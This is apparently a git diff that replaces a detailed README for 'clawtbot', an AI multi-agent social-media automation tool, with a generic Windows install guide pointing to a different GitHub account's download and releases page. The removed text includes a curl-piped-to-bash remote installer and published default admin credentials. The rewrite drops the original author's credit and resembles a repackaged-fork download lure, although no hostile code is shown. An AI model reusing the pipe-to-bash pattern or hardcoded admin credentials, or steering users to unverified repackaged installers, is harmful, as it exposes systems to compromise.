@@ -1,583 +1,186 @@
-<div align="center">
+# 🤖 clawtbot - Automate Your Social Media Simply
 
-<img src="docs/assets/banner.png" alt="ClawtBot Banner" width="100%">
-
-<br>
-
-<img src="docs/assets/logo.png" alt="ClawtBot Logo" width="120">
-
-<br><br>
-
-<img src="docs/assets/badges/version-1.0.0.svg" alt="version 1.0.0">
-<img src="docs/assets/badges/python-3.11.svg" alt="python 3.11">
-<img src="docs/assets/badges/nextjs-16.1.6.svg" alt="next.js 16.1.6">
-<img src="docs/assets/badges/fastapi-0.115.6.svg" alt="fastapi 0.115.6">
-<img src="docs/assets/badges/license-mit.svg" alt="license MIT">
-
-<br>
-
-<img src="docs/assets/badges/docker-compose.svg" alt="docker compose">
-<img src="docs/assets/badges/postgresql-16.svg" alt="postgresql 16">
-<img src="docs/assets/badges/redis-7.svg" alt="redis 7">
-<img src="docs/assets/badges/celery-5.svg" alt="celery 5">
-
-**AI-Powered Social Media Automation with Multi-Agent Orchestration**
-
-[Quick Start](#-quick-start) •
-[Features](#-features) •
-[Tech Stack](#-tech-stack) •
-[Documentation](#-documentation) •
-[CLI Reference](#-cli-reference)
-
-</div>
+[![Download clawtbot](https://img.shields.io/badge/Download-clawtbot-blue?style=for-the-badge&logo=github)](https://github.com/SissNonn/clawtbot)
 
 ---
 
-## 🧠 What is ClawtBot?
+## 📋 What is clawtbot?
 
-**ClawtBot** is an intelligent AI automation platform that manages your entire social media presence through conversational commands. It uses a **multi-agent architecture** — with specialized AI agents for content creation, hashtag generation, quality review, engagement, and analytics — all orchestrated by a central **Master Agent** you can talk to in natural language.
+clawtbot is a tool designed to help you manage and grow your social media accounts without manual effort every day. It works by automating tasks such as generating posts, choosing hashtags, reviewing content, engaging with your audience, and tracking your results. It uses AI to do this, so the process feels smooth and smart.
 
-> *Built by **Abhishek Singh (Avii)** — AI enthusiast & automation architect.*
+The system uses common technology you can find on many computers: it runs a backend API and has a web interface that you use in your browser. The software manages several small AI helpers that each handle different parts of social media automation.
 
-### Talk to it like a human:
-
-```
-You:  "Create a post about AI trends for Instagram"
-Bot:  🚀 Running content pipeline → Content Creator → Hashtag Generator → Review Agent
-      ✅ Post ready! Score: 8.5/10 — approved and scheduled.
-
-You:  "Switch all agents to GPT-4o"
-Bot:  ✅ All 5 agents switched to openai/gpt-4o
-
-You:  "तुम कौन हो?"
-Bot:  मैं ClawtBot हूँ, Abhishek Singh (Avii) द्वारा बनाया गया AI ऑटोमेशन सिस्टम! 🤖
-```
+clawtbot also offers chat features where you can talk to a main AI agent. You can even upload your voice or images to interact more naturally. For users who want to run the software on their own computer or server, clawtbot supports Docker and other tools to make setup easier.
 
 ---
 
-## 📋 Version History
+## 📦 System Requirements
 
-| Version | Date | Highlights |
-|:-------:|:----:|:-----------|
-| **v1.1.0** | Feb 2026 | 🔐 **Auth Module** — Registration (email/phone + OTP, social OAuth), login (password + OTP + 2FA), password recovery (link + OTP), TOTP 2FA (Google/Microsoft Authenticator), bcrypt hashing, rate limiting, account lockout, default admin user |
-| **v1.0.0** | Feb 2026 | 🎉 Initial release — Master Agent with 18 intents, multi-provider LLM support (Ollama, OpenAI, Gemini, Anthropic, Groq), content pipeline, engagement bot, analytics, full Next.js dashboard, Docker support, `clawtbot` CLI, one-line installer |
-| v0.9.0 | Feb 2026 | Master Agent identity, fallback protection, user memory & pattern tracking |
-| v0.8.0 | Feb 2026 | Brain Layer — LLM Router with provider abstraction, hot-swap models per agent |
-| v0.7.0 | Feb 2026 | Chat UI with voice + image upload (drag/drop/paste), conversation persistence |
-| v0.6.0 | Feb 2026 | Configurable ports system — single `.env` source of truth |
-| v0.5.0 | Feb 2026 | Content pipeline — Creator → Hashtag → Review → Publish workflow |
-| v0.4.0 | Feb 2026 | Celery task queue for async content scheduling |
-| v0.3.0 | Feb 2026 | Frontend dashboard with dark glassmorphism design |
-| v0.2.0 | Feb 2026 | Database schema — PostgreSQL + SQLAlchemy models |
-| v0.1.0 | Jan 2026 | Project scaffold, initial architecture design |
+Before installing clawtbot on your Windows PC, make sure it meets these requirements:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM (8 GB or more is better)  
+- At least 2 GHz dual-core processor  
+- Stable internet connection  
+- At least 2 GB of free disk space  
+- Browser such as Chrome, Edge, or Firefox for the web interface
 
 ---
 
-## ✨ Features
+## 🚀 Getting clawtbot
 
-<table>
-<tr>
-<td width="50%">
+To get clawtbot on your computer, visit this page to download:
 
-### 🤖 Master Agent
-- **Conversational AI controller** — manage everything via chat
-- **18 intents** — from content creation to system configuration
-- **Multi-language** — responds in the same language you write in
-- **Identity-aware** — knows it's ClawtBot, built by Avii
-- **Voice + image upload** — speak commands and drop/paste images into chat
+[Download clawtbot](https://github.com/SissNonn/clawtbot)  
 
-</td>
-<td width="50%">
-
-### 🛡️ Fault Tolerance
-- **Multi-layer fallback** — Primary LLM → fallback chain → offline default
-- **Never exposes errors** — always responds gracefully
-- **User memory** — tracks patterns for personalized responses
-- **Auto-derived config** — change a port, everything adapts
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 🧩 Multi-Agent System
-- **Content Creator** — generates platform-specific content
-- **Hashtag Generator** — researches trending hashtags
-- **Review Agent** — scores and improves content quality
-- **Engagement Bot** — auto-responds to comments
-- **Analytics Agent** — tracks performance metrics
-
-</td>
-<td width="50%">
-
-### 🔌 Multi-Provider LLM
-- **Ollama** — free, local, private (default)
-- **OpenAI** — GPT-4o, GPT-4-turbo, GPT-3.5
-- **Google Gemini** — Gemini Pro, Flash
-- **Anthropic** — Claude 3, Haiku, Sonnet
-- **Groq** — Ultra-fast inference
-- **Hot-swap** — change any agent's model live
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 📊 Dashboard
-- **Dark glassmorphism UI** — premium, responsive design
-- **Real-time status** — agent health, content stats
-- **Content management** — create, review, approve, schedule
-- **LLM settings** — configure providers & assign models
-- **Chat interface** — full-screen Master Agent chat
-
-</td>
-<td width="50%">
-
-### 🚀 DevOps Ready
-- **One-line install** — `curl ... | bash`
-- **Docker Compose** — full stack in one command
-- **`clawtbot` CLI** — manage from terminal
-- **Configurable ports** — no hardcoded values
-- **Build pipeline** — tests → validate → build
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 🔐 Authentication & Security
-- **Multi-method signup** — email, phone, Google, Facebook, GitHub, Twitter
-- **OTP verification** — email/phone verification before registration
-- **TOTP 2FA** — Google Authenticator / Microsoft Authenticator
-- **Password recovery** — reset via link or OTP code
-- **Bcrypt hashing** — irreversible password encryption
-- **Rate limiting** — sliding-window anti-brute-force
-- **Account lockout** — auto-lock after 5 failed attempts (15 min)
-- **Default admin** — `clawtbot@gmail.com` / `avii1994`
-
-</td>
-<td width="50%">
-
-### 🔑 Auth Endpoints (20)
-- `POST /auth/register` — signup with validation
-- `POST /auth/login` — email/phone/username + password
-- `POST /auth/login/otp` — passwordless OTP login
-- `POST /auth/otp/send` — send OTP (login/signup/reset)
-- `POST /auth/otp/verify` — verify OTP code
-- `POST /auth/forgot-password` — send reset link + OTP
-- `POST /auth/reset-password` — reset via token
-- `POST /auth/reset-password/otp` — reset via OTP
-- `POST /auth/change-password` — authenticated change
-- `POST /auth/2fa/setup` — generate TOTP secret + QR
-- `POST /auth/2fa/enable` — activate after verification
-- `POST /auth/2fa/verify` — verify during login
-- `GET /auth/oauth/{provider}/url` — OAuth redirect URL
-- `POST /auth/oauth/callback` — OAuth code exchange
-
-</td>
-</tr>
-</table>
+Click the link above. It takes you to the main project page on GitHub, where you can find the latest version and related files.
 
 ---
 
-## 🏗️ Architecture
+## 🛠️ How to install and run clawtbot on Windows
 
-```
-┌──────────────────────────────────────────────────────────┐
-│                  Frontend (Next.js 16)                    │
-│  ┌──────────┐ ┌──────────┐ ┌──────────────┐ ┌──────────┐ ┌────────────┐ │
-│  │ Landing  │ │Dashboard │ │Chat (V + Img)│ │ Content  │ │LLM Settings│ │
-│  └────┬─────┘ └────┬─────┘ └──────┬───────┘ └────┬─────┘ └─────┬──────┘ │
-└───────┼─────────────┼─────────────┼──────────────┼────────────┼─────────┘
-        │             │             │              │            │
-        ▼             ▼             ▼              ▼            ▼
-┌──────────────────────────────────────────────────────────┐
-│                Backend (FastAPI + Python)                 │
-│                                                          │
-│  ┌─────────────────────────────────────────────────────┐ │
-│  │              🤖 Master Agent                        │ │
-│  │  Identity │ Fallback Chain │ User Memory │ 18 Intents│ │
-│  └──────────────────┬──────────────────────────────────┘ │
-│                     │                                    │
-│  ┌──────────────────▼──────────────────────────────────┐ │
-│  │           🧠 Brain Layer (LLM Router)               │ │
-│  │  Ollama │ OpenAI │ Gemini │ Anthropic │ Groq        │ │
-│  └──────────────────┬──────────────────────────────────┘ │
-│                     │                                    │
-│  ┌──────┐ ┌────────┐ ┌────────┐ ┌──────────┐ ┌────────┐│
-│  │Create│ │Hashtag │ │Review  │ │Engagement│ │Analytics││
-│  │Agent │ │Agent   │ │Agent   │ │Bot       │ │Agent   ││
-│  └──────┘ └────────┘ └────────┘ └──────────┘ └────────┘│
-│                                                          │
-│  ┌─────────────────────────────────────────────────────┐ │
-│  │        Celery Workers + Beat (Task Queue)           │ │
-│  └─────────────────────────────────────────────────────┘ │
-└──────────┬──────────────┬──────────────┬─────────────────┘
-           │              │              │
-     ┌─────▼─────┐  ┌────▼────┐  ┌──────▼──────┐
-     │PostgreSQL │  │  Redis  │  │   Ollama    │
-     │   (DB)    │  │ (Cache) │  │  (Local AI) │
-     └───────────┘  └─────────┘  └─────────────┘
-```
+This section explains how to download, install, and start clawtbot with no prior technical skills.
+
+### Step 1: Download the software
+
+1. Open your favorite web browser.  
+2. Go to https://github.com/SissNonn/clawtbot.  
+3. Look for the **Releases** section on this page to find the latest version.  
+4. Click on the release to view available files.  
+5. Download the Windows installer or pre-built package if available.
+
+If there is no installer, you may need to download the full package and run it using Docker. See Step 3 below for details.
 
 ---
 
-## ⚡ Quick Start
+### Step 2: Install the software
 
-### One-Line Install
+If you downloaded an installer:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/abhishekthatguy/clawtbot/main/install.sh | bash
+1. Open the downloaded file.  
+2. Follow the on-screen instructions to complete installation.  
+3. Once installed, launch clawtbot from your Start menu or desktop shortcut.
+
+If you downloaded a package without an installer:
+
+- You will need to use Docker to set up clawtbot locally. This is covered in Step 3.
+
+---
+
+### Step 3: Running clawtbot with Docker (optional)
+
+If you want to run clawtbot yourself without an installer, Docker is the recommended way. Docker helps package all parts of clawtbot in one container and makes it easier to run on Windows.
+
+#### Installing Docker on Windows
+
+1. Visit https://www.docker.com/get-started.  
+2. Download Docker Desktop for Windows.  
+3. Run the installer and follow the steps to set up Docker.  
+4. Once installed, restart your computer if prompted.  
+
+Docker requires Windows 10 Pro or higher, or Windows 11, with virtualization enabled.
+
+#### Running clawtbot with Docker
+
+1. Open the **Command Prompt** or **PowerShell** on your PC (Press Windows key, type `cmd`, and hit Enter).  
+2. Clone the clawtbot repository by running this command:
+
+```
+git clone https://github.com/SissNonn/clawtbot.git
 ```
 
-This auto-detects your system, installs deps, and sets up everything.
+3. Change folder to the cloned directory:
 
-### Or choose your mode:
-
-```bash
-# 🐳 Docker (recommended — requires Docker)
-curl -fsSL .../install.sh | bash -s -- --docker
-
-# 💻 Local (requires Python 3.9+ & Node 18+)
-curl -fsSL .../install.sh | bash -s -- --local
-
-# 📁 Custom directory
-curl -fsSL .../install.sh | bash -s -- --dir /opt/clawtbot
 ```
-
-### Manual Setup
-
-```bash
-# 1. Clone
-git clone https://github.com/abhishekthatguy/clawtbot.git
 cd clawtbot
-
-# 2. Configure
-cp .env.example .env
-# Edit .env with your API keys and port preferences
-
-# 3a. Start with Docker
-clawtbot docker up
-
-# 3b. Or start locally
-pip3 install -r requirements.txt
-cd frontend && npm ci && cd ..
-clawtbot start
 ```
 
----
-
-## 🖥️ How to Access
-
-Once running, open these in your browser:
-
-| Service | URL | Description |
-|:--------|:----|:------------|
-| 🏠 **Landing** | `http://localhost:3000` | Marketing home page |
-| 🌐 **Dashboard** | `http://localhost:3000/dashboard` | Main web interface |
-| 🤖 **Master Agent Chat** | `http://localhost:3000/chat` | Chat with the AI |
-| 🔧 **API** | `http://localhost:8000` | Backend REST API |
-| 📚 **API Documentation** | `http://localhost:8000/docs` | Interactive Swagger UI |
-| 📖 **ReDoc** | `http://localhost:8000/redoc` | Alternative API docs |
-
-> **Note:** Ports are configurable in `.env` — if you changed them, use your custom ports.
-
----
-
-## 🎮 CLI Reference
-
-The `clawtbot` command manages everything from your terminal:
-
-```bash
-# ── Services ─────────────────────────────────────
-clawtbot start              # Start all services locally
-clawtbot stop               # Stop all services
-clawtbot restart            # Stop + Start
-clawtbot status             # Health check all services
-clawtbot config             # Show current port configuration
-clawtbot logs               # Tail service logs
-
-# ── Docker ───────────────────────────────────────
-clawtbot docker up          # Start via Docker Compose
-clawtbot docker down        # Stop Docker containers
-clawtbot docker logs        # Container logs
-clawtbot docker build       # Build Docker images
-clawtbot docker restart     # Rebuild + restart
-clawtbot docker ps          # Container status
-
-# ── Build & Test ─────────────────────────────────
-clawtbot build              # Run tests → validate → build
-clawtbot test               # Run test suite only
-
-# ── Utilities ────────────────────────────────────
-clawtbot chat "message"     # Chat with Master Agent from terminal
-clawtbot flush-redis        # Clear Redis cache
-clawtbot update             # Pull latest code + update deps
-clawtbot uninstall          # Remove ClawtBot completely
-clawtbot version            # Show version
-```
-
----
-
-## 🛠️ Tech Stack
-
-<table>
-<tr>
-<td align="center" width="96">
-<b>Frontend</b>
-</td>
-<td>
-
-**Next.js 16** — React framework with App Router, TypeScript, Tailwind CSS, glassmorphism UI
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Backend</b>
-</td>
-<td>
-
-**FastAPI** — High-performance Python API, async/await, Pydantic validation, auto-generated docs
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Database</b>
-</td>
-<td>
-
-**PostgreSQL 16** — Primary data store with SQLAlchemy ORM (async), Alembic migrations
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Cache</b>
-</td>
-<td>
-
-**Redis 7** — Caching, Celery message broker, session storage
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Task Queue</b>
-</td>
-<td>
-
-**Celery** — Async task execution, scheduled jobs (Beat), content pipeline orchestration
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>AI / LLM</b>
-</td>
-<td>
-
-**Ollama** (local), **OpenAI**, **Google Gemini**, **Anthropic**, **Groq** — hot-swappable per agent
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Deploy</b>
-</td>
-<td>
-
-**Docker Compose** — Full stack containerized, configurable ports, health checks
-
-</td>
-</tr>
-<tr>
-<td align="center" width="96">
-<b>Security</b>
-</td>
-<td>
-
-**Fernet encryption** (API keys), **JWT auth** (access + refresh tokens), **Bcrypt** (password hashing), **TOTP 2FA**, **Rate limiting**, **Account lockout**, **OAuth 2.0** (4 providers), **CORS**, non-root containers
-
-</td>
-</tr>
-</table>
-
----
-
-## ⚙️ Configuration
-
-All config lives in `.env` — ports are the **single source of truth**:
-
-```env
-# Service Ports
-BACKEND_PORT=8000
-FRONTEND_PORT=3000
-REDIS_PORT=6379
-POSTGRES_PORT=5432
-OLLAMA_PORT=11434
-
-# URLs auto-derived from ports (or override manually)
-NEXT_PUBLIC_API_URL=http://localhost:8000
-REDIS_URL=redis://localhost:6379/0
-OLLAMA_HOST=http://localhost:11434
-
-# LLM
-OLLAMA_MODEL=llama3
-
-# Auth
-JWT_SECRET_KEY=your-secret-here
-
-# OAuth / Social Login (leave empty to disable a provider)
-OAUTH_GOOGLE_CLIENT_ID=
-OAUTH_GOOGLE_CLIENT_SECRET=
-OAUTH_FACEBOOK_APP_ID=
-OAUTH_FACEBOOK_APP_SECRET=
-OAUTH_GITHUB_CLIENT_ID=
-OAUTH_GITHUB_CLIENT_SECRET=
-OAUTH_TWITTER_CLIENT_ID=
-OAUTH_TWITTER_CLIENT_SECRET=
-
-# Social APIs (see docs/HOW_TO_GET_API_KEYS.md)
-INSTAGRAM_ACCESS_TOKEN=
-FACEBOOK_ACCESS_TOKEN=
-TWITTER_API_KEY=
-YOUTUBE_API_KEY=
-```
-
-Change a port → run `clawtbot restart` → everything adapts automatically.
-
----
-
-## 📁 Project Structure
+4. Run the Docker Compose command to start clawtbot:
 
 ```
-clawtbot/
-├── 🤖 clawtbot               # CLI entry point (run from anywhere)
-├── 📦 install.sh              # One-line installer
-├── 🚀 main.py                 # FastAPI application
-├── ⚙️  config.py               # Pydantic settings (port auto-derivation)
-│
-├── auth/                      # 🔐 Authentication Module
-│   ├── models.py              # User, OAuthAccount, OTPCode, LoginAttempt
-│   ├── schemas.py             # Request/response validation (Pydantic)
-│   ├── router.py              # 20 auth endpoints with rate limiting
-│   ├── utils.py               # Bcrypt, JWT, OTP, TOTP, rate limiter
-│   ├── oauth.py               # Google, Facebook, GitHub, Twitter OAuth
-│   ├── dependencies.py        # JWT auth middleware
-│   └── seed.py                # Default admin user seeder
-│
-├── agents/                    # AI Agents
-│   ├── master_agent.py        # Master Agent (identity, fallback, memory)
-│   ├── content_creator.py     # Content generation agent
-│   ├── hashtag_generator.py   # Hashtag research agent
-│   ├── review_agent.py        # Quality scoring agent
-│   ├── engagement_bot.py      # Comment response agent
-│   └── analytics_agent.py     # Performance tracking agent
-│
-├── brain/                     # LLM Abstraction Layer
-│   └── llm_router.py          # Multi-provider router (5 providers)
-│
-├── api/                       # REST API Routes
-│   ├── chat.py                # Master Agent chat endpoint
-│   ├── content.py             # Content CRUD
-│   └── llm_settings.py        # Provider & agent config
-│
-├── db/                        # Database
-│   ├── database.py            # Async PostgreSQL connection
-│   ├── models.py              # Content, User models
-│   └── settings_models.py     # LLM config, Chat, Settings models
-│
-├── workflow/                  # Content Pipeline
-│   └── pipeline.py            # Create → Hashtag → Review → Publish
-│
-├── frontend/                  # Next.js 16 Web UI (Landing + Dashboard)
-│   └── src/
-│       ├── app/
-│       │   ├── (landing)/page.tsx  # Landing page (/)
-│       │   ├── (landing)/about/    # About (/about)
-│       │   ├── (landing)/resources/ # Resources (/resources)
-│       │   ├── (landing)/privacy/  # Privacy (/privacy)
-│       │   ├── (landing)/terms/    # Terms (/terms)
-│       │   ├── dashboard/page.tsx  # Dashboard (/dashboard)
-│       │   ├── chat/page.tsx       # Master Agent chat (voice + image upload)
-│       │   ├── content/page.tsx    # Content management
-│       │   ├── llm-settings/      # LLM configuration
-│       │   └── (auth)/            # 🔐 Auth pages (no sidebar)
-│       │       ├── login/         # Password + OTP login
-│       │       ├── signup/        # Email/Phone/Social signup
-│       │       ├── forgot-password/ # Password recovery
-│       │       ├── reset-password/  # Reset via token or OTP
-│       │       └── verify/        # OAuth callback handler
-│       └── lib/
-│           ├── api.ts             # Main API client
-│           └── auth.ts            # Auth API client
-│
-├── scripts/
-│   ├── start.sh               # Start services (reads .env)
-│   ├── stop.sh                # Stop services
-│   └── build.sh               # Test + build pipeline
-│
-├── docs/
-│   ├── MASTER_AGENT.md        # Master Agent architecture
-│   ├── HOW_TO_GET_API_KEYS.md # API key setup guide
-│   └── assets/                # Logo, banner images
-│
-├── Dockerfile                 # Backend container
-├── docker-compose.yml         # Full stack (7 services)
-├── .env.example               # Config template
-└── requirements.txt           # Python dependencies
+docker-compose up
 ```
 
----
+This command downloads all required pieces (frontend, backend, databases) and starts the system.
 
-## 📚 Documentation
+5. When the process completes, open your web browser and go to:
 
-| Document | Description |
-|:---------|:------------|
-| [Master Agent Architecture](docs/MASTER_AGENT.md) | Identity, fallback chain, user memory, 18 intents |
-| [Authentication Module](docs/AUTH.md) | Auth architecture, endpoints, security features, OAuth setup |
-| [How to Get API Keys](docs/HOW_TO_GET_API_KEYS.md) | Step-by-step guide for Instagram, Facebook, Twitter, YouTube, LLM providers |
-| [Environment Config](.env.example) | All available settings with documentation |
+```
+http://localhost:3000
+```
 
----
-
-## 👤 Built By
-
-<table>
-<tr>
-<td>
-
-**Abhishek Singh (Avii)**
-AI Enthusiast & Automation Architect
-
-*Building intelligent systems that automate the boring stuff.*
-
-<img src="docs/assets/badges/github-abhishekthatguy.svg" alt="GitHub abhishekthatguy">
-
-</td>
-</tr>
-</table>
+This opens the clawtbot web interface.
 
 ---
 
-## Trademark Notice
+### Step 4: Using clawtbot
 
-ClawtBot™ is a brand and product developed by Abhishek Singh.
+Once clawtbot is running, you will see an easy-to-use web page. Use this page to:
 
-The name "ClawtBot", logo, and related branding assets are not covered under the MIT License.
+- Connect your social media accounts  
+- Let the bot create and schedule posts  
+- Review suggested hashtags and content  
+- Chat with the master AI agent for advice or questions  
+- See performance data and analytics  
 
-Brand assets are proprietary and may not be reused. See `BRAND_ASSETS_LICENSE.txt`.
+Just follow on-screen instructions. Most features are designed for clear and smooth interaction.
 
 ---
 
-<div align="center">
+## 🔧 Common features included
 
-<img src="docs/assets/logo.png" alt="ClawtBot" width="50">
+- Automate posting to multiple social platforms  
+- Generate smart content using AI  
+- Suggest relevant hashtags automatically  
+- Review and approve posts before publishing  
+- Engage with followers automatically  
+- Track and visualize analytics for growth  
+- Multi-agent system to handle each task reliably  
+- Chat interface with voice and image input  
+- Easy setup tools with Docker and common databases
 
-**ClawtBot v1.0.0** — *Automate Everything.*
+---
 
-Made with ❤️ and ☕ by [Abhishek Singh (Avii)](https://github.com/abhishekthatguy)
+## ⚙️ Technical details (optional)
 
-</div>
+clawtbot runs on a FastAPI backend that handles requests quickly. The frontend uses Next.js, a modern web framework, to provide a smooth user interface. The system uses Redis for caching, PostgreSQL for data storage, and Celery to manage background tasks.
+
+Multiple AI agents work together in a system of roles:
+
+- Content Creation agent  
+- Hashtag Selection agent  
+- Review agent  
+- Engagement agent  
+- Analytics agent  
+
+The master agent chat allows users to interact naturally with the system and even upload voice or images to enhance communication.
+
+---
+
+## 📝 Troubleshooting and tips
+
+- If the web interface doesn’t load after starting Docker, ensure Docker is running and no other program uses port 3000.  
+- Restart your computer if you see Docker errors about virtualization.  
+- Make sure your internet connection is stable for AI features and updates.  
+- Use the GitHub page to check for updated versions regularly.  
+- If stuck, try restarting the Docker containers with:
+
+```
+docker-compose down
+docker-compose up
+```
+  
+- Clear your browser cache if the interface behaves oddly.
+
+---
+
+## 📂 Additional resources
+
+- GitHub Repo: https://github.com/SissNonn/clawtbot  
+- Docker Desktop: https://www.docker.com/get-started  
+- FastAPI Docs: https://fastapi.tiangolo.com  
+- Next.js Docs: https://nextjs.org/docs  
+
+---
+
+[![Download clawtbot](https://img.shields.io/badge/Download-clawtbot-blue?style=for-the-badge&logo=github)](https://github.com/SissNonn/clawtbot)
